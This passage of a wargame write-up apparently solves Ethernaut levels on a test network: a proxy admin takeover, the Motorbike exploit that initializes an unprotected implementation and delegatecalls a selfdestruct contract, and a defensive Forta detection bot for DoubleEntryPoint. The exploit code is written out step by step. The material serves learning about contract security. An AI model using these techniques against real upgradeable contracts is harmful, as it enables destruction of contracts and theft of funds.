<pre class=" language-python"><code class="prism  language-python">max_balance_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>setMaxBalance<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>to<span class="token operator">=</span>puzzleproxy<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token operator">=</span>max_balance_data<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x3eae8adb1340f9e1837061e7150eeb863e35d2c403c86f0074389017c78e1903">https://rinkeby.etherscan.io/tx/0x3eae8adb1340f9e1837061e7150eeb863e35d2c403c86f0074389017c78e1903</a></p>
<ol start="8">
<li>Check if I’m admin</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># check if my address is the admin address</span>
admin_assertion <span class="token operator">=</span> puzzleproxy<span class="token punctuation">.</span>admin<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The admin of the contract is {acc.address}, therefore my address is admin: {admin_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-23">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x6bce85a663ae4b8b5d19fcc8b6fa400d2dc34b597dd67ce556107819e0742b36">https://rinkeby.etherscan.io/tx/0x6bce85a663ae4b8b5d19fcc8b6fa400d2dc34b597dd67ce556107819e0742b36</a></p>
<hr>
<h2 id="motorbike">Motorbike</h2>
<h3 id="objectives-23">Objectives</h3>
<p>Would you be able to <code>selfdestruct</code> its engine and make the motorbike unusable ?</p>
<h3 id="solution-23">Solution</h3>
<p>The Engine contract inherits from Initializable, which means the initializer function is restricted to be called once. However, because the Engine is the implementation and Motorbike is the proxy, the initializer modifier doesn’t restrict EOAs or other contracts from calling the <code>initialize()</code> function and through <code>upgradeToAndCall()</code> effectively passing any call to the implementation. The call is passed through the <code>_upgradeToAndCall()</code> function in a <code>delegatecall</code>, this way we just deploy a malicious contract with <code>selfdestruct()</code> call in a function and call this function as if the caller was the engine contract.</p>
<p>The steps to reproduce it are simple:</p>
<ol>
<li>
<p>Get the address of the Engine implementation, as defined in Motorbike identical to how they’re usually defined in an Upgradeable Proxy contract</p>
</li>
<li>
<p>Call the <code>initialize()</code> function to become <code>upgrader</code> and be able to pass calls to the <code>_authorizeUpgrade()</code> function</p>
</li>
<li>
<p>Deploy a malicious contract with a single function that can self destruct the contract.</p>
</li>
<li>
<p>Call the function that would normally self destructs the malicious contract through a <code>delegatecall</code> in <code>upgradeToAndCall()</code> in the Engine contract by passing in the malicious contract address as <code>newImplementation</code> and the data that would call the function as <code>data</code>. After this, the Engine implementation contract will be destroyed.</p>
</li>
</ol>
<h3 id="how-i-did-it-23">How I did it</h3>
<ol>
<li>Find the implementation address of the Engine contract</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># find engine contract implementation</span>
storage_position_impl_address <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">'eip1967.proxy.implementation'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
implementation_address <span class="token operator">=</span> f<span class="token string">'0x{web3.eth.get_storage_at(motorbike.address, storage_position_impl_address).hex()[-40:]}'</span>

<span class="token comment"># load Engine contract</span>
eg <span class="token operator">=</span> Engine<span class="token punctuation">.</span>at<span class="token punctuation">(</span>implementation_address<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Call <code>initialize()</code> in the Engine contract</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># initialize the engine implementation</span>
eg<span class="token punctuation">.</span>initialize<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x79c0e38730d584e33f5e291452c09ae91542f349bd8772dedf451b4d58b3275a">https://rinkeby.etherscan.io/tx/0x79c0e38730d584e33f5e291452c09ae91542f349bd8772dedf451b4d58b3275a</a></p>
<ol start="3">
<li>Deploy a BombEngine contract (at: <code>0x89a05702875f0c18FF5B28640ea3DdE39FDe6E47</code>) with only a single function that can self destruct such contract</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">boom</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token function">selfdestruct</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># deploy our bomb engine contract</span>
be <span class="token operator">=</span> BombEngine<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<ol start="4">
<li>Call <code>UpgradeToAndCall()</code> in the Engine implementation contract as described in <a href="#solution-23">solution</a>.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># call upgradeToAndCall() to selfdestruct the Engine implementation contract</span>
selfdestruct_call <span class="token operator">=</span> be<span class="token punctuation">.</span>boom<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
eg<span class="token punctuation">.</span>upgradeToAndCall<span class="token punctuation">(</span>be<span class="token punctuation">.</span>address<span class="token punctuation">,</span> selfdestruct_call<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x93e405003cb3065ae97a1c2d493eeba85a9b5f85f1db6b4fa0d27f3847ee23b6">https://rinkeby.etherscan.io/tx/0x93e405003cb3065ae97a1c2d493eeba85a9b5f85f1db6b4fa0d27f3847ee23b6</a></p>
<ol start="5">
<li>Confirm that the contract has been successfully destroyed by checking if we can call the getter function for one of the state variables, in this case <code>upgrader()</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token comment"># call the getter function</span>
    eg<span class="token punctuation">.</span>upgrader<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># print if it didnt fail</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The contract was not successfully self destructed'</span><span class="token punctuation">)</span>

    <span class="token comment"># return that it failed</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token comment"># print if it failed</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The contract was successfully self destructed'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># return that it succeeded</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
</code></pre>
<h3 id="submission-transaction-24">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xbc0466a3268b594bb4c1273a022e188c359a0d26c379ee265f5a095ea17b0fce">https://rinkeby.etherscan.io/tx/0xbc0466a3268b594bb4c1273a022e188c359a0d26c379ee265f5a095ea17b0fce</a></p>
<hr>
<h2 id="doubleentrypoint">DoubleEntryPoint</h2>
<h3 id="objectives-24">Objectives</h3>
<p>Your job is to implement a detection bot and register it in the Forta contract. The bot’s implementation will need to raise correct alerts to prevent potential attacks or bug exploits.</p>
<h3 id="solution-24">Solution</h3>
<p>The vulnerability in the CryptoVault contract is present in the <code>sweepToken()</code> function. There’s two ways we can sweep the DoubleEntryPoint tokens:</p>
<ol>
<li>
<p>By calling <code>sweepToken()</code> and passing the DoubleEntryPoint token contract address</p>
</li>
<li>
<p>By calling <code>sweepToken()</code> and passing the LegacyToken token contract address</p>
</li>
</ol>
<p>There’s a require statement in the function which compares if this token contract address is the <code>underlying</code> token contract address defined (or modified) by the <code>setUnderlying()</code> function (which we can’t call because the <code>underlying</code> token contract address is not the null address) is the DoubleEntryPoint token contract address, however, it does NOT check if it’s the LegacyToken token contract address.</p>
<p>When we pass the LegacyToken token contract address, the LegacyToken contract will receive the transfer call and instead delegate this transfer to the DoubleEntryPoint token contract, which will result in these tokens moving when <code>sweepToken()</code> is called.</p>
<p>As we can see in the DoubleEntryPoint token contract, we have the ability to use the Forta contract to create a detection bot, essentially, another contract that will trigger an alert when an otherwise unexpected event occurs.</p>
<p>To protect against the CryptoVault vulnerability, we have create a detection bot contract which checks whether the CryptoVault contract is the one attempting to transfer the tokens out of the contract. If the CryptoVault address is found in the calldata of that function call, then we prevent the contract from transferring the tokens and revert the transaction by raising the alert. If the alert counter increases, then the transaction is reverted.</p>
<p>To do this we can either pull the data directly from the calldata by knowing where the <code>origSender</code> address (parameter of the <code>delegateTransfer()</code> function in the DoubleEntryPoint token contract) is within that calldata, so essentially what its offset is. This can be deducted by knowing how calldata is layed out. Once we know the offset, we can pull the data from that offset and compare it to the CryptoVault address. If <code>origSender</code> is the CryptoVault address, we raise the alert.</p>
<p>Alternatively, we can go byte by byte within that calldata until we find the offset where <code>origSender</code> is located and compare it with the CryptoVault address. Once the loop reaches this point and we successfully make the comparison, then the transaction will either continue (if <code>origSender</code> is not the CryptoVault address) or be reverted (if <code>origSender</code> is the CryptoVault address).</p>
<h3 id="how-i-did-it-24">How I did it</h3>
<ol>
<li>Get the CryptoVault contract address from the DoubleEntryPoint <code>cryptoVault</code> state variable.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># get cryptovault address</span>
cryptovault_address <span class="token operator">=</span> dep<span class="token punctuation">.</span>cryptoVault<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Instantiate the CryptoVault contract. I do this to later call <code>sweepToken()</code> in order to test my detection bot</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">cryptovault <span class="token operator">=</span> CryptoVault<span class="token punctuation">.</span>at<span class="token punctuation">(</span>cryptovault_address<span class="token punctuation">)</span>
</code></pre>
<ol start="3">
<li>Get the Forta contract address and instantiate the Forta contract to later call <code>setDetectionBot()</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">forta <span class="token operator">=</span> Forta<span class="token punctuation">.</span>at<span class="token punctuation">(</span>dep<span class="token punctuation">.</span>forta<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<ol start="4">
<li>Code and deploy (at: <code>0xA662bD0c21450a80c5B3fCA07709771Eb720EcB6</code>) DetectionBot contract that raises an alert if the CryptoVault address is found in the calldata when <code>sweepToken()</code> is called. I decided to code this using a loop which goes over every offset of the calldata (up until a max of the total size of the calldata in bytes, in this case 228 bytes). I recognize this is less efficient than simply figuring out where <code>origSender</code> is in the calldata, but I wanted to try solving the problem how I would otherwise do it in a different programming language that I’m more familiar with. This is a sort of ‘bruteforce’ type way to find it, but for the time being, I’m okay with that.</li>
</ol>
<p>That said, I coded the <code>handleTransaction()</code> function as follows:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">handleTransaction</span><span class="token punctuation">(</span>address user<span class="token punctuation">,</span> bytes calldata<span class="token punctuation">)</span> <span class="token keyword">public</span> override <span class="token punctuation">{</span>
    uint dataValue<span class="token punctuation">;</span>
    uint calldataloadPos <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    uint _calldatasize<span class="token punctuation">;</span>

    <span class="token comment">// get calldata size (in bytes) so the loop ends where the data ends</span>
    assembly <span class="token punctuation">{</span>
        _calldatasize <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>calldataloadPos <span class="token operator">&lt;</span> _calldatasize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// obtain the next 32-byte item from the calldata</span>
        assembly <span class="token punctuation">{</span>
            dataValue <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">calldataload</span><span class="token punctuation">(</span>calldataloadPos<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// check if the address is present in the next 32 byte slot</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dataValue <span class="token operator">==</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">uint160</span><span class="token punctuation">(</span>cryptoVault<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// raise alert if address is present in calldata</span>
            forta<span class="token punctuation">.</span><span class="token function">raiseAlert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// add one to calldataloadpos</span>
            assembly <span class="token punctuation">{</span>
                calldataloadPos <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>calldataloadPos<span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>The deployment is done in python as follows:</p>
<pre class=" language-python"><code class="prism  language-python">bot <span class="token operator">=</span> DetectionBot<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>cryptovault_address<span class="token punctuation">,</span> forta<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="5">
<li>Set the detection bot calling <code>setDetectionBot()</code> in the forta contract with the bot contract address</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">forta<span class="token punctuation">.</span>setDetectionBot<span class="token punctuation">(</span>bot<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="6">
<li>Get the LegacyToken token contract address to later pass it as a parameter to <code>sweepToken()</code> in CryptoVault</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># get the legacy token contract address</span>
legacytoken <span class="token operator">=</span> dep<span class="token punctuation">.</span>delegatedFrom<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<ol start="7">
<li>Try sweeping the tokens while allowing the transaction to revert</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">cryptovault<span class="token punctuation">.</span>sweepToken<span class="token punctuation">(</span>legacytoken<span class="token punctuation">,</span> _from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'allow_revert'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ol start="8">
<li>Check if the revert message is the correct one (meaning the alert was triggered)</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">revert_msg_assertion <span class="token operator">=</span> history<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>revert_msg <span class="token operator">==</span> <span class="token string">'Alert has been triggered, reverting'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The transaction triggered the forta alert: {revert_msg_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-25">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x3edb0cb77a9b738b830f6fe7b7b460b2a698ec70d36f66097ca71b9c7c389ce2">https://rinkeby.etherscan.io/tx/0x3edb0cb77a9b738b830f6fe7b7b460b2a698ec70d36f66097ca71b9c7c389ce2</a></p>

